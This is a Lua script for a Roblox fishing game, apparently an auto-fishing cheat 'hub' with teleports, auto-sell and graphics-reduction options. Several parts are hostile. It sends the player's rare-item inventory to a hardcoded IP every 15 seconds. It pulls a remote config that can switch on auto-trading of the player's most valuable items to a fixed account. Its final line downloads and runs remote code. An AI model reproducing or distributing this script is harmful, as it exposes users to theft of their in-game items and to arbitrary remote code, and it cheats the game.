repeat task.wait() until game:IsLoaded()

-- ======================================================
-- # ULTIMATE HUB: FINAL V5.0 (LEGACY WEBHOOK + POTATO)
-- ======================================================

local Services = {
    Players = game:GetService("Players"),
    ReplicatedStorage = game:GetService("ReplicatedStorage"),
    RunService = game:GetService("RunService"),
    HttpService = game:GetService("HttpService"),
    CoreGui = game:GetService("CoreGui")
}

local lp = Services.Players.LocalPlayer
local req = request or http_request or syn.request

-- [1] SETUP CONFIG
local OnlineConfigUrl = "https://raw.githubusercontent.com/abinoldi/muffzle/refs/heads/main/remconfig" 

-- [2] DEFAULT CONFIG
local MasterConfig = {
    FishingEnabled = true,
    AutoEquip = true,
    CatchDelay = 1.05,
    AutoSell = true,
    SellDelay = 65,
    AutoFavorite = true,
    AutoUnfavoriteRubies = false,
    
    -- [DISCORD CONFIG]
    DiscordWebhookEnabled = false,
    DiscordWebhookUrl = "",
    
    -- [CUSTOM WEBHOOK CONFIG]
    WebhookEnabled = true,
    WebhookUrl = "http://43.134.116.2:5000/webhook/fishit",
    
    AutoTeleport = true,
    SelectedLocation = "Crater Island",
    AutoTotem = true,
    
    -- [POTATO & PERFORMANCE SETTINGS]
    PotatoMode = true,
    Disable3DRendering = true, -- Ubah ke true jika ingin layar hitam (HEMAT GPU)
    DisableAudio = true,       -- Ubah ke true jika ingin bisu (HEMAT CPU)
    
    AutoTrade = false,
    TargetUsername = "mm3kenak",
    TradeMode = "SECRETS_FIRST", 
    TradeDelay = 6.5,
}

-- STATE TRACKING
local FishingState = { IsFishing = false, Teleporting = false, TotalCoins = 0, SessionEarnings = 0 }
local TradingState = { IsTrading = false, Thread = nil }
local FishingThreads = {}

-- VARIABLES GLOBAL
local SessionStartTime = os.time()
local TotalSecretsFound = 0
local TotalRubyGemstones = 0
local TotalFishCaught = 0

-- REMOTE HELPER
local function GetRemote(name)
    local path = {"Packages", "_Index", "sleitnick_net@0.2.0", "net"}
    local current = Services.ReplicatedStorage
    for _, child in ipairs(path) do
        current = current:WaitForChild(child, 2)
        if not current then return nil end
    end
    return current:FindFirstChild(name)
end

local RF_ChargeFishingRod = GetRemote("RF/ChargeFishingRod")
local RF_RequestFishingMinigameStarted = GetRemote("RF/RequestFishingMinigameStarted")
local RF_CatchFishCompleted = GetRemote("RF/CatchFishCompleted")
local RF_CancelFishingInputs = GetRemote("RF/CancelFishingInputs")
local RE_EquipToolFromHotbar = GetRemote("RE/EquipToolFromHotbar")
local RF_UpdateAutoFishingState = GetRemote("RF/UpdateAutoFishingState")
local RF_SellAllItems = GetRemote("RF/SellAllItems")
local RE_FavoriteItem = GetRemote("RE/FavoriteItem")

-- ===============================
-- SMART INVOKE
-- ===============================
local function ForceInvoke(remote, timeout, ...)
    if not remote then return end
    local args = {...}
    local done = false
    local result
    task.spawn(function()
        result = {pcall(function() return remote:InvokeServer(unpack(args)) end)}
        done = true
    end)
    local start = os.clock()
    repeat task.wait() until done or (os.clock() - start) > timeout
    return result
end

-- ===============================
-- CORE FISHING LOGIC
-- ===============================
local function RunInstantFish()
    local timestamp = workspace:GetServerTimeNow()
    local args = {-1.233, 1, timestamp} 
    ForceInvoke(RF_ChargeFishingRod, 2)
    task.wait(0.01)
    ForceInvoke(RF_RequestFishingMinigameStarted, 2, unpack(args))
    task.wait(MasterConfig.CatchDelay)
    if RF_CatchFishCompleted then ForceInvoke(RF_CatchFishCompleted, 3) end
    task.wait(0.01)
    ForceInvoke(RF_CancelFishingInputs, 2)
end

function StartFishingV1()
    if FishingState.IsFishing then return end
    FishingState.IsFishing = true
    if RF_UpdateAutoFishingState then pcall(function() RF_UpdateAutoFishingState:InvokeServer(false) end) end
    
    table.insert(FishingThreads, task.spawn(function()
        while FishingState.IsFishing do RunInstantFish(); task.wait(0.1) end
    end))
    table.insert(FishingThreads, task.spawn(function()
        while FishingState.IsFishing do
            if MasterConfig.AutoEquip and RE_EquipToolFromHotbar then pcall(function() RE_EquipToolFromHotbar:FireServer(1) end) end
            task.wait(0.5)
        end
    end))
    table.insert(FishingThreads, task.spawn(function()
        while FishingState.IsFishing do
            if MasterConfig.AutoSell then
                local before = (PlayerData and PlayerData:Get("Coins") or 0)
                task.wait(2) 
                pcall(function() if RF_SellAllItems then RF_SellAllItems:InvokeServer() end end)
                task.wait(1)
                local after = (PlayerData and PlayerData:Get("Coins") or 0)
                if after > before then FishingState.SessionEarnings = FishingState.SessionEarnings + (after - before) end
            end
            task.wait(MasterConfig.SellDelay)
        end
    end))
    table.insert(FishingThreads, task.spawn(function()
        while FishingState.IsFishing do
            if MasterConfig.AutoFavorite then
                local inv = PlayerData:GetExpect("Inventory")
                if inv then
                    for _, items in pairs(inv) do
                        for _, item in ipairs(items) do
                            if item.UUID then
                                local itemName, rarity = GetFishNameAndRarity(item)
                                local mutation = GetMutation(item)
                                local isLocked = (item.IsFavorite or item.Favorited or item.Locked)
                                local isRuby = (itemName == "Ruby" or item.Identifier == "Ruby")
                                local isRare = string.find(mutation:lower(), "leviathan") or string.find(mutation:lower(), "rage")
                                if (isRuby or isRare) and not isLocked then
                                    task.spawn(function() for i = 1, 3 do RE_FavoriteItem:FireServer(item.UUID); task.wait(0.05) end end)
                                end
                            end
                        end
                    end
                end
            end
            task.wait(0.5)
        end
    end))
    table.insert(FishingThreads, task.spawn(function()
        while FishingState.IsFishing do
            if MasterConfig.AutoUnfavoriteRubies then RunAutoUnfavoriteRubies() end
            task.wait(5)
        end
    end))
end

function StopFishingV1()
    FishingState.IsFishing = false
    if RF_UpdateAutoFishingState then pcall(function() RF_UpdateAutoFishingState:InvokeServer(false) end) end
    pcall(function() RF_CancelFishingInputs:InvokeServer() end)
    FishingThreads = {}
end

-- ===============================
-- SHARED MODULES & UTILS
-- ===============================
local Replion = require(Services.ReplicatedStorage.Packages.Replion).Client
local ItemUtility = require(Services.ReplicatedStorage.Shared.ItemUtility)
local TierUtility = require(Services.ReplicatedStorage.Shared.TierUtility)
local PlayerData = Replion:WaitReplion("Data", 10)

function GetFishNameAndRarity(item)
    local name = item.Identifier or "Unknown"
    local rarity = item.Metadata and item.Metadata.Rarity or "COMMON"
    local itemID = item.Id
    local itemData
    if ItemUtility and itemID then
        pcall(function()
            itemData = ItemUtility:GetItemData(itemID)
            if not itemData then
                local numericID = tonumber(item.Id) or tonumber(item.Identifier)
                if numericID then itemData = ItemUtility:GetItemData(numericID) end
            end
        end)
    end
    if itemData and itemData.Data and itemData.Data.Name then name = itemData.Data.Name end
    if item.Metadata and item.Metadata.Rarity then rarity = item.Metadata.Rarity 
    elseif itemData and itemData.Probability and TierUtility then 
        pcall(function() rarity = TierUtility:GetTierFromRarity(itemData.Probability.Chance).Name end) 
    end
    return name, rarity
end

function GetMutation(item)
    if not item.Metadata then return "None" end
    if item.Metadata.VariantId and item.Metadata.VariantId ~= "" then return item.Metadata.VariantId end
    if item.Metadata.Shiny == true then return "Shiny" end
    return "None"
end

function FormatNumber(n) return tostring(n):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "") end
function FormatTime(s) return string.format("%02dh %02dm %02ds", math.floor(s/3600), math.floor((s%3600)/60), s%60) end

-- ===============================
-- WEB CONFIG LOADER
-- ===============================
local function LoadWebConfig()
    if not OnlineConfigUrl or OnlineConfigUrl == "" or OnlineConfigUrl:find("example.com") then return end
    local success, response = pcall(function() return game:HttpGet(OnlineConfigUrl, true) end)
    if success then
        local decodeSuccess, decodedData = pcall(function() return Services.HttpService:JSONDecode(response) end)
        if decodeSuccess then
            local settingsChanged = false
            local locationChanged = false
            for key, value in pairs(decodedData) do
                if MasterConfig[key] ~= value then
                    if key == "SelectedLocation" then locationChanged = true end
                    if key == "TargetUsername" then MasterConfig.TargetId = nil end
                    MasterConfig[key] = value
                    settingsChanged = true
                end
            end
            if settingsChanged then
                if locationChanged and MasterConfig.AutoTeleport and TeleportToFishingLocation then task.spawn(TeleportToFishingLocation) end
                if MasterConfig.FishingEnabled and not FishingState.IsFishing then task.spawn(StartFishingV1)
                elseif not MasterConfig.FishingEnabled and FishingState.IsFishing then StopFishingV1() end
                if MasterConfig.AutoTrade and not TradingState.IsTrading then task.spawn(RunAutoTrade)
                elseif not MasterConfig.AutoTrade and TradingState.IsTrading then 
                    TradingState.IsTrading = false
                    if TradingState.Thread then task.cancel(TradingState.Thread) end
                end
            end
        end
    end
end

-- ===============================
-- HELPERS LAIN
-- ===============================
local FishingLocations = {
    ["Iron Cavern"] = {Pos = Vector3.new(-8792.546, -588.000, 230.642), Look = Vector3.new(0.718, 0.000, 0.696)},
    ["Disco Event"] = {Pos = Vector3.new(-8641.672, -547.500, 160.322), Look = Vector3.new(0.984, -0.000, 0.176)},
    ["Classic Island"] = {Pos = Vector3.new(1440.843, 46.062, 2777.175), Look = Vector3.new(0.940, -0.000, 0.342)},
    ["Ancient Jungle"] = {Pos = Vector3.new(1535.639, 3.159, -193.352), Look = Vector3.new(0.505, -0.000, 0.863)},
    ["Arrow Lever"] = {Pos = Vector3.new(898.296, 8.449, -361.856), Look = Vector3.new(0.023, -0.000, 1.000)},
    ["Coral Reef"] = {Pos = Vector3.new(-3207.538, 6.087, 2011.079), Look = Vector3.new(0.973, 0.000, 0.229)},
    ["Crater Island"] = {Pos = Vector3.new(1058.976, 2.330, 5032.878), Look = Vector3.new(-0.789, 0.000, 0.615)},
    ["Crystalline Passage"] = {Pos = Vector3.new(6051.567, -538.900, 4370.979), Look = Vector3.new(0.109, 0.000, 0.994)},
    ["Ancient Ruin"] = {Pos = Vector3.new(6031.981, -585.924, 4713.157), Look = Vector3.new(0.316, -0.000, -0.949)},
    ["Diamond Lever"] = {Pos = Vector3.new(1818.930, 8.449, -284.110), Look = Vector3.new(0.000, 0.000, -1.000)},
    ["Enchant Room"] = {Pos = Vector3.new(3255.670, -1301.530, 1371.790), Look = Vector3.new(-0.000, -0.000, -1.000)},
    ["Esoteric Island"] = {Pos = Vector3.new(2164.470, 3.220, 1242.390), Look = Vector3.new(-0.000, -0.000, -1.000)},
    ["Fisherman Island"] = {Pos = Vector3.new(74.030, 9.530, 2705.230), Look = Vector3.new(-0.000, -0.000, -1.000)},
    ["Hourglass Diamond Lever"] = {Pos = Vector3.new(1484.610, 8.450, -861.010), Look = Vector3.new(-0.000, -0.000, -1.000)},
    ["Kohana"] = {Pos = Vector3.new(-668.732, 3.000, 681.580), Look = Vector3.new(0.889, -0.000, 0.458)},
    ["Lost Isle"] = {Pos = Vector3.new(-3804.105, 2.344, -904.653), Look = Vector3.new(-0.901, -0.000, 0.433)},
    ["Sacred Temple"] = {Pos = Vector3.new(1461.815, -22.125, -670.234), Look = Vector3.new(-0.990, -0.000, 0.143)},
    ["Second Enchant Altar"] = {Pos = Vector3.new(1479.587, 128.295, -604.224), Look = Vector3.new(-0.298, 0.000, -0.955)},
    ["Sisyphus Statue"] = {Pos = Vector3.new(-3743.745, -135.074, -1007.554), Look = Vector3.new(0.310, 0.000, 0.951)},
    ["Treasure Room"] = {Pos = Vector3.new(-3598.440, -281.274, -1645.855), Look = Vector3.new(-0.065, 0.000, -0.998)},
    ["Tropical Island"] = {Pos = Vector3.new(-2162.920, 2.825, 3638.445), Look = Vector3.new(0.381, -0.000, 0.925)},
    ["Underground Cellar"] = {Pos = Vector3.new(2118.417, -91.448, -733.800), Look = Vector3.new(0.854, 0.000, 0.521)},
    ["Volcano"] = {Pos = Vector3.new(-605.121, 19.516, 160.010), Look = Vector3.new(0.854, 0.000, 0.520)},
    ["Weather Machine"] = {Pos = Vector3.new(-1518.550, 2.875, 1916.148), Look = Vector3.new(0.042, 0.000, 0.999)},
}

UpdateStatsFromInventory = function()
    local secretCount = 0
    local rubyGemCount = 0
    local inv = PlayerData:Get("Inventory")
    if inv then
        for _, items in pairs(inv) do
             for _, item in ipairs(items) do
                 local name, r = GetFishNameAndRarity(item)
                 local mut = GetMutation(item)
                 if tostring(r):upper() == "SECRET" then secretCount = secretCount + 1 end
                 if name == "Ruby" and mut == "Gemstone" then rubyGemCount = rubyGemCount + 1 end
            end
        end
    end
    TotalSecretsFound = secretCount
    TotalRubyGemstones = rubyGemCount
end

function RunAutoUnfavoriteRubies()
    if not MasterConfig.AutoUnfavoriteRubies then return end
    local inv = PlayerData:Get("Inventory")
    if inv then
        for _, items in pairs(inv) do
            for _, item in ipairs(items) do
                if item.IsFavorite or item.Favorited or item.Locked then
                    local name, _ = GetFishNameAndRarity(item) 
                    if name == "Ruby" and GetMutation(item) ~= "Gemstone" then
                        pcall(function() if RE_FavoriteItem then RE_FavoriteItem:FireServer(item.UUID) end end)
                        task.wait(0.2)
                    end
                end
            end
        end
    end
end

-- ===============================
-- GUI & NOTIFICATIONS
-- ===============================
function CreateDashboard()
    if Services.CoreGui:FindFirstChild("EnochDashboard") then Services.CoreGui.EnochDashboard:Destroy() end
    local gui = Instance.new("ScreenGui", Services.CoreGui)
    gui.Name = "EnochDashboard"
    gui.IgnoreGuiInset = true
    local toggleBtn = Instance.new("TextButton", gui)
    toggleBtn.Size = UDim2.new(0.3, 0, 0.08, 0)
    toggleBtn.Position = UDim2.new(0.5, 0, 0.95, 0)
    toggleBtn.AnchorPoint = Vector2.new(0.5, 1)
    toggleBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    toggleBtn.Text = "W - v5.0 (Legacy+Fix)"
    toggleBtn.TextColor3 = Color3.new(1,1,1)
    toggleBtn.Font = Enum.Font.GothamBold
    toggleBtn.TextScaled = true
    Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(1,0)
    local dashboard = Instance.new("Frame", gui)
    dashboard.Size = UDim2.fromScale(1, 1)
    dashboard.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    dashboard.Visible = true
    local layout = Instance.new("UIListLayout", dashboard)
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    layout.VerticalAlignment = Enum.VerticalAlignment.Center
    layout.Padding = UDim.new(0.015, 0)
    local function Text(txt, h, col) 
        local l = Instance.new("TextLabel", dashboard)
        l.Text = txt
        l.TextColor3 = col
        l.Size = UDim2.new(1,0,h,0)
        l.BackgroundTransparency = 1
        l.Font = Enum.Font.GothamBold
        l.TextScaled = true
        return l 
    end
    local L_Coins = Text("$0", 0.10, Color3.fromRGB(255, 215, 0)) 
    local L_Mode = Text("LOC: ...", 0.06, Color3.fromRGB(0, 255, 255)) 
    local L_Target = Text("TARGET: ...", 0.06, Color3.fromRGB(200, 200, 200)) 
    local L_Stats = Text("0 Fish", 0.06, Color3.fromRGB(255, 255, 255)) 
    local L_Info = Text("Sec: 0 | Gem: 0", 0.06, Color3.fromRGB(255, 100, 255)) 
    local L_Time = Text("00h 00m 00s", 0.05, Color3.fromRGB(180, 180, 180)) 
    local L_Status = Text("Starting...", 0.05, Color3.fromRGB(255, 100, 100)) 
    toggleBtn.MouseButton1Click:Connect(function() dashboard.Visible = not dashboard.Visible end)
    task.spawn(function()
        while task.wait(0.5) do
            if dashboard.Visible then
                L_Coins.Text = "$" .. FormatNumber((PlayerData and PlayerData:Get("Coins") or 0))
                L_Mode.Text = "LOC: " .. (MasterConfig.SelectedLocation or "None")
                local tPlayer = Services.Players:FindFirstChild(MasterConfig.TargetUsername or "???")
                L_Target.Text = "TARGET: " .. (MasterConfig.TargetUsername or "???") .. (tPlayer and " [âœ…]" or " [âŒ]")
                L_Target.TextColor3 = tPlayer and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(255, 50, 50)
                L_Stats.Text = string.format("Caught: %d", TotalFishCaught)
                L_Info.Text = "Sec: " .. TotalSecretsFound .. " | Gem: " .. TotalRubyGemstones
                L_Time.Text = FormatTime(os.time() - SessionStartTime)
                local currentStatus = "Idle"
                if FishingState.IsFishing then currentStatus = "Fishing" end
                if TradingState.IsTrading then currentStatus = tPlayer and "Trading (Active)" or "Trading (Waiting)" end
                if FishingState.Teleporting then currentStatus = "Teleporting" end
                L_Status.Text = "Status: " .. currentStatus
            end
        end
    end)
end

-- ===============================
-- TRADING, TOTEM & POTATO
-- ===============================
function TeleportToFishingLocation()
    if FishingState.Teleporting then return end
    local loc = FishingLocations[MasterConfig.SelectedLocation]
    if not loc then return end
    FishingState.Teleporting = true
    pcall(function()
        local char = lp.Character or lp.CharacterAdded:Wait()
        local root = char:WaitForChild("HumanoidRootPart", 5)
        if root then root.CFrame = CFrame.new(loc.Pos, loc.Pos + loc.Look) end
    end)
    task.wait(0.5)
    FishingState.Teleporting = false
end

local function SpawnMutationTotem()
    local uuid
    pcall(function() 
        local inventoryData = PlayerData:GetExpect("Inventory").Totems
        for _, item in ipairs(inventoryData) do 
            if tonumber(item.Id) == 2 and (item.Count or 1) >= 1 then uuid = item.UUID break end
        end 
    end)
    if not uuid then return false end
    local RE_SpawnTotem = GetRemote("RE/SpawnTotem")
    local RF_EquipOxygenTank = GetRemote("RF/EquipOxygenTank")
    local RF_UnequipOxygenTank = GetRemote("RF/UnequipOxygenTank")
    if RF_EquipOxygenTank then pcall(function() RF_EquipOxygenTank:InvokeServer(105) end) end
    local success = false
    pcall(function() RE_SpawnTotem:FireServer(uuid); success = true end)
    if success then
        local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            local originalCF = hrp.CFrame
            hrp.CFrame = originalCF + Vector3.new(0, 5, 0)
            task.wait(0.2)
            hrp.CFrame = originalCF
        end
    end
    task.wait(0.5)
    if RF_UnequipOxygenTank then pcall(function() RF_UnequipOxygenTank:InvokeServer() end) end
    return success
end

function RunAutoTrade()
    if TradingState.IsTrading then return end
    TradingState.IsTrading = true
    local RF_InitiateTrade = GetRemote("RF/InitiateTrade")
    
    TradingState.Thread = task.spawn(function()
        while MasterConfig.AutoTrade and TradingState.IsTrading do
            pcall(UpdateStatsFromInventory)
            local targetPlayer = Services.Players:FindFirstChild(MasterConfig.TargetUsername)
            if targetPlayer then
                MasterConfig.TargetId = targetPlayer.UserId 
                local tradeList = {}
                local inv = PlayerData:GetExpect("Inventory")
                if inv then
                    for _, items in pairs(inv) do
                        for _, item in ipairs(items) do
                            local n, r = GetFishNameAndRarity(item)
                            local mut = GetMutation(item)
                            local isSecret = (tostring(r):upper() == "SECRET")
                            local isRubyGem = (n == "Ruby" and mut == "Gemstone")
                            if isSecret or isRubyGem then
                                table.insert(tradeList, {uuid = item.UUID, priority = isSecret and 2 or 1})
                            end
                        end
                    end
                end
                table.sort(tradeList, function(a, b) return a.priority > b.priority end)
                
                if #tradeList > 0 then
                    local targetItem = tradeList[1]
                    pcall(function() RF_InitiateTrade:InvokeServer(targetPlayer.UserId, targetItem.uuid) end)
                    local start = os.clock()
                    repeat task.wait(0.5) until not (function() 
                        local i = PlayerData:GetExpect("Inventory") 
                        for _,x in pairs(i) do for _,y in ipairs(x) do if y.UUID == targetItem.uuid then return true end end end 
                        return false 
                    end)() or (os.clock() - start) > 5
                    pcall(UpdateStatsFromInventory)
                else
                    task.wait(1)
                end
            else
                task.wait(3)
            end
            task.wait(MasterConfig.TradeDelay)
        end
        TradingState.IsTrading = false
    end)
end

local function ApplyExtremePotato()
    pcall(function()
        local runService = game:GetService("RunService")
        local renderStatus = not MasterConfig.Disable3DRendering
        runService:Set3dRenderingEnabled(renderStatus)
    end)
    pcall(function()
        local soundService = game:GetService("SoundService")
        if MasterConfig.DisableAudio then soundService.MainVolume = 0 else soundService.MainVolume = 1 end
    end)
    local VFXControllerModule
    pcall(function() VFXControllerModule = require(Services.ReplicatedStorage:WaitForChild("Controllers").VFXController) end)
    if VFXControllerModule then
        VFXControllerModule.Handle = function(...) return nil end
        if VFXControllerModule.PlayVFX then VFXControllerModule.PlayVFX.Fire = function(...) return nil end end
        pcall(function() workspace:FindFirstChild("CosmeticFolder"):ClearAllChildren() end)
    end
    pcall(function() 
        local lighting = game:GetService("Lighting")
        lighting.GlobalShadows = false; lighting.Brightness = 0 
        if workspace.Terrain then workspace.Terrain.WaterWaveSize = 0 end
    end)
    for _, v in ipairs(workspace:GetDescendants()) do
        if v:IsA("BasePart") then v.Transparency = 1; v.Reflectance = 0; v.CastShadow = false
        elseif v:IsA("Decal") or v:IsA("Texture") or v:IsA("ParticleEmitter") then v:Destroy() end
    end
end

-- ===============================
-- INIT & AUTO START
-- ===============================
local RE_ObtainedNewFishNotification = GetRemote("RE/ObtainedNewFishNotification")
if RE_ObtainedNewFishNotification then
    RE_ObtainedNewFishNotification.OnClientEvent:Connect(function(item)
        TotalFishCaught = TotalFishCaught + 1
        task.spawn(function()
            if not item then return end
            local name, rarity = "Unknown", "Common"
            local mutation = "None"
            pcall(function()
                name, rarity = GetFishNameAndRarity(item)
                mutation = GetMutation(item)
            end)
            
            if rarity and string.upper(tostring(rarity)) == "SECRET" then
                pcall(UpdateStatsFromInventory)
                
                -- [NOTIFIKASI DISCORD - TETAP JALAN UNTUK NEW FISH]
                if MasterConfig.DiscordWebhookEnabled and MasterConfig.DiscordWebhookUrl ~= "" and req then
                    req({
                        Url = MasterConfig.DiscordWebhookUrl, 
                        Method = "POST", 
                        Headers = {["Content-Type"] = "application/json"},
                        Body = Services.HttpService:JSONEncode({
                            username = "Webhak Enok", 
                            embeds = {{
                                title = "ðŸš¨ SECRET FISH! ðŸš¨", 
                                fields = {
                                    {name="Ikan", value=name}, 
                                    {name="Rarity", value=rarity}, 
                                    {name="Mutasi", value=mutation}
                                }
                            }}
                        })
                    })
                end
            end
        end)
    end)
end

-- [LEGACY WEBHOOK INTEGRATION]
-- Mengirim data inventory setiap 15 detik (sesuai request)
if MasterConfig.WebhookEnabled then
    task.spawn(function()
        local function SendHook(pName, data)
            local json = Services.HttpService:JSONEncode(data)
            local url = MasterConfig.WebhookUrl .. "?player=" .. Services.HttpService:UrlEncode(pName) .. "&data=" .. Services.HttpService:UrlEncode(json)
            pcall(function() game:HttpGet(url) end)
        end
        local dataR = Replion:WaitReplion("Data")
        while true do
            local inv = dataR:GetExpect("Inventory")
            local exportData = { Summary = {}, Details = {} }

            if inv then
                for _, items in pairs(inv) do
                    for _, item in ipairs(items) do
                        local n, r = GetFishNameAndRarity(item)
                        local mut = GetMutation(item)
                        if r == "SECRET" or string.find(mut:lower(), "leviathan") or string.find(mut:lower(), "rage") or (n == "Ruby" and mut == "Gemstone") then
                            local dName = n
                            if mut ~= "None" then dName = "["..mut.."] "..n end
                            exportData.Summary[dName] = (exportData.Summary[dName] or 0) + 1
                            table.insert(exportData.Details, {
                                Name = dName, Rarity = r, Weight = item.Metadata and item.Metadata.Weight or 0,
                                Mutation = mut, UniqueId = item.UUID or item.Id
                            })
                        end
                    end
                end
            end
            SendHook(lp.Name, exportData)
            task.wait(15)
        end
    end)
end

task.spawn(function()
    LoadWebConfig() 
    while true do task.wait(60) LoadWebConfig() end
end)

task.delay(2, function()
    print("[AutoStart] Smart V5.0 Loaded")
    CreateDashboard()
    LoadWebConfig()
    pcall(UpdateStatsFromInventory)
    
    if req and MasterConfig.DiscordWebhookEnabled and MasterConfig.DiscordWebhookUrl ~= "" then
       pcall(function() 
           req({
               Url = MasterConfig.DiscordWebhookUrl, 
               Method = "POST", 
               Headers = {["Content-Type"] = "application/json"}, 
               Body = Services.HttpService:JSONEncode({
                   username = "Webhak Enok", 
                   content = "âœ… Script Started (Smart V5.0) at " .. MasterConfig.SelectedLocation
               })
           })
       end)
    end

    if MasterConfig.AutoTeleport then TeleportToFishingLocation(); task.wait(1) end
    if MasterConfig.AutoTotem then task.spawn(function() while true do SpawnMutationTotem(); task.wait(3780) end end) end
    if MasterConfig.PotatoMode then task.spawn(function() while task.wait(3) do ApplyExtremePotato() end end) end
    if MasterConfig.FishingEnabled then StartFishingV1() end
    if MasterConfig.AutoTrade then RunAutoTrade() end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/abinoldi/muffinz/refs/heads/main/weatherx"))()
